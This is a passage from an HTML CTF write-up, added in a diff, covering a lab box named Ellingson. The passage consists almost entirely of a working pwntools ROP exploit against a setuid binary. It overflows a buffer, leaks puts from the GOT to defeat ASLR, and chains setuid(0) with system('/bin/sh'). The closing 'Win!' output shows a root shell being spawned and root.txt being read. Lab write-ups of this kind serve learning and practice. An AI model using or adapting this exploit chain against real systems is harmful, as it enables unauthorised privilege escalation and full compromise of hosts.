+                pop_rdi_addr&nbsp;&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x0040179b</span>)&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;gdb-peda,&nbsp;break&nbsp;main,&nbsp;run,&nbsp;ropsearch&nbsp;"pop&nbsp;rdi;&nbsp;ret"</span><br>
+                main_plt_addr&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x401619</span>)&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;objdump&nbsp;-D&nbsp;garbage&nbsp;|&nbsp;grep&nbsp;main</span><br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">136</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP</span><br>
+                <span style="color:#0088ff;font-weight:400">#Stage&nbsp;1a&nbsp;-&nbsp;leak&nbsp;address&nbsp;of&nbsp;puts()&nbsp;by&nbsp;reading&nbsp;from&nbsp;GOT</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;puts_got_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;puts()&nbsp;GOT&nbsp;address&nbsp;into&nbsp;RDI</span><br>
+                payload&nbsp;+=&nbsp;puts_plt_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;puts(puts_got_addr)&nbsp;to&nbsp;read&nbsp;value&nbsp;@&nbsp;puts_got_addr&nbsp;in&nbsp;GOT&nbsp;and&nbsp;leak&nbsp;address</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#Stage&nbsp;1b&nbsp;-&nbsp;return&nbsp;to&nbsp;main</span><br>
+                payload&nbsp;+=&nbsp;main_plt_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;set&nbsp;up&nbsp;for&nbsp;stage&nbsp;2&nbsp;-&nbsp;return&nbsp;to&nbsp;main&nbsp;to&nbsp;put&nbsp;exploit&nbsp;back&nbsp;into&nbsp;working&nbsp;state</span><br>
+                <br>
+                p&nbsp;=&nbsp;s.process(<span style="color:#3ad900;font-weight:400">'/usr/bin/garbage'</span>)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;start&nbsp;process&nbsp;with&nbsp;pwntools</span><br>
+                p.sendline(payload)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;send&nbsp;payload</span><br>
+                p.recvuntil(<span style="color:#3ad900;font-weight:400">"denied."</span>)<br>
+                leaked_puts&nbsp;=&nbsp;p.recv()[:<span style="color:#ff0044;font-weight:400">8</span>].strip().ljust(<span style="color:#ff0044;font-weight:400">8</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"\x00"</span>)&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;receive&nbsp;leaked&nbsp;puts&nbsp;address&nbsp;from&nbsp;GOT&nbsp;&lt;--&nbsp;SYNTAX&nbsp;OF&nbsp;THIS&nbsp;LINE&nbsp;IS&nbsp;ABSOLUTELY&nbsp;CRUCIAL.&nbsp;ADDRESS&nbsp;IS&nbsp;TOTALLY&nbsp;DIFFERENT&nbsp;IF&nbsp;THIS&nbsp;LINE&nbsp;IS&nbsp;ALTERED</span><br>
+                <br>
+                upack_leaked_puts&nbsp;=&nbsp;u64(leaked_puts)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;unpack&nbsp;leaked&nbsp;puts&nbsp;into&nbsp;address</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Leaked&nbsp;puts@GLIBC:&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(upack_leaked_puts)<br>
+                <span style="color:#0088ff;font-weight:400">#p.interactive()</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;----------------------------------------------------------</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Stage&nbsp;2&nbsp;-&nbsp;Calculate&nbsp;libc&nbsp;setuid()&nbsp;and&nbsp;libc&nbsp;system()&nbsp;address&nbsp;using&nbsp;leaked&nbsp;puts&nbsp;address</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2a)&nbsp;run&nbsp;setuid(0)</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2b)&nbsp;run&nbsp;system("/bin/sh")&nbsp;to&nbsp;spawn&nbsp;a&nbsp;shell!</span><br>
+                <br>
+                libc_puts_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x0809c0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;puts</span><br>
+                libc_setuid_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x0e5970</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;setuid</span><br>
+                libc_system_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x04f440</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;readelf&nbsp;-s&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;system</span><br>
+                libc_binsh_offset&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x1b3e9a</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;strings&nbsp;-a&nbsp;-t&nbsp;x&nbsp;/lib/x86_64-linux-gnu/libc.so.6&nbsp;|&nbsp;grep&nbsp;/bin/sh</span><br>
+                <br>
+                null&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x0</span>)<br>
+                <br>
+                libc_base_addr&nbsp;=&nbsp;upack_leaked_puts&nbsp;-&nbsp;libc_puts_offset<br>
+                libc_setuid_addr&nbsp;=&nbsp;p64(libc_base_addr&nbsp;+&nbsp;libc_setuid_offset)<br>
+                libc_system_addr&nbsp;=&nbsp;p64(libc_base_addr&nbsp;+&nbsp;libc_system_offset)<br>
+                libc_binsh_addr&nbsp;=&nbsp;p64(libc_base_addr&nbsp;+&nbsp;libc_binsh_offset)<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Calculated&nbsp;addresses:"</span><br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"1&nbsp;-&nbsp;libc&nbsp;base&nbsp;address:&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(libc_base_addr)<br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"2&nbsp;-&nbsp;libc&nbsp;setuid&nbsp;address:&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(u64(libc_setuid_addr))<br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"3&nbsp;-&nbsp;libc&nbsp;system&nbsp;address:&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(u64(libc_system_addr))<br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"4&nbsp;-&nbsp;libc&nbsp;/bin/sh&nbsp;address:&nbsp;"</span>&nbsp;+&nbsp;<span style="color:#ff9d00;font-weight:700">hex</span>(u64(libc_binsh_addr))<br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">136</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP</span><br>
+                <span style="color:#0088ff;font-weight:400">#Stage&nbsp;2a&nbsp;-&nbsp;setuid(0)</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;null&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;0&nbsp;into&nbsp;RDI</span><br>
+                payload&nbsp;+=&nbsp;libc_setuid_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;setuid(0)</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#Stage&nbsp;2b&nbsp;-&nbsp;system("/bin/sh")</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_addr<br>
+                payload&nbsp;+=&nbsp;libc_binsh_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;libc&nbsp;"/bin/sh"&nbsp;string&nbsp;into&nbsp;RDI</span><br>
+                payload&nbsp;+=&nbsp;libc_system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;libc&nbsp;system("/bin/sh")</span><br>
+                <br>
+                p.sendline(payload)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;THE&nbsp;EXPLOIT&nbsp;WORKS!</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;if&nbsp;I&nbsp;send&nbsp;"AAAA",&nbsp;we&nbsp;don't&nbsp;get&nbsp;a&nbsp;shell&nbsp;with&nbsp;p.interactive()</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;when&nbsp;I&nbsp;send&nbsp;the&nbsp;payload,&nbsp;we&nbsp;get&nbsp;a&nbsp;shell!</span><br>
+                <span style="color:#0088ff;font-weight:400">#p.recvuntil("denied.")</span><br>
+                p.interactive()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;use&nbsp;pwntools&nbsp;to&nbsp;spawn&nbsp;an&nbsp;interactive&nbsp;session/shell</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-11" name="h2-11"></a><strong></strong>
+        <h2><strong>9) Win!</strong></h2><br>
+        Run the exploit and go win!<br>
+            <div class="codebox">
+                root@city64:~/ctf/ellingson#&nbsp;python&nbsp;garbageRemote.py<br>
+                [+]&nbsp;Connecting&nbsp;to&nbsp;10.10.10.139&nbsp;on&nbsp;port&nbsp;22:&nbsp;Done<br>
+                ...<br>
+                [*]&nbsp;margo@10.10.10.139:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Distro&nbsp;&nbsp;&nbsp;&nbsp;Ubuntu&nbsp;18.04<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;OS:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;linux<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Arch:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;amd64<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Version:&nbsp;&nbsp;4.15.0<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;ASLR:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enabled<br>
+                [+]&nbsp;Starting&nbsp;remote&nbsp;process&nbsp;'/usr/bin/garbage'&nbsp;on&nbsp;10.10.10.139:&nbsp;pid&nbsp;2260<br>
+                Leaked&nbsp;puts@GLIBC:&nbsp;0x7f29fc30c9c0<br>
+                Calculated&nbsp;addresses:<br>
+                1&nbsp;-&nbsp;libc&nbsp;base&nbsp;address:&nbsp;0x7f29fc28c000<br>
+                2&nbsp;-&nbsp;libc&nbsp;setuid&nbsp;address:&nbsp;0x7f29fc371970<br>
+                3&nbsp;-&nbsp;libc&nbsp;system&nbsp;address:&nbsp;0x7f29fc2db440<br>
+                4&nbsp;-&nbsp;libc&nbsp;/bin/sh&nbsp;address:&nbsp;0x7f29fc43fe9a<br>
+                [*]&nbsp;Switching&nbsp;to&nbsp;interactive&nbsp;mode<br>
+                <br>
+                access&nbsp;denied.<br>
+                #&nbsp;$&nbsp;id<br>
+                uid=0(root)&nbsp;gid=1002(margo)&nbsp;groups=1002(margo)<br>
+                #&nbsp;$&nbsp;whoami<br>
+                root<br>
+                #&nbsp;$&nbsp;cd&nbsp;/root<br>
+                #&nbsp;$&nbsp;ls<br>
+                root.txt<br>
+                #&nbsp;$&nbsp;cat&nbsp;root.txt<br>
+                1cc73a4...<br>
+                #&nbsp;$&nbsp;exit<br>
+                [*]&nbsp;Got&nbsp;EOF&nbsp;while&nbsp;reading&nbsp;in&nbsp;interactive<br>
+                $&nbsp;exit<br>
+                [*]&nbsp;Stopped&nbsp;remote&nbsp;process&nbsp;'garbage'&nbsp;on&nbsp;10.10.10.139&nbsp;(pid&nbsp;2260)<br>
+                [*]&nbsp;Got&nbsp;EOF&nbsp;while&nbsp;sending&nbsp;in&nbsp;interactive
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
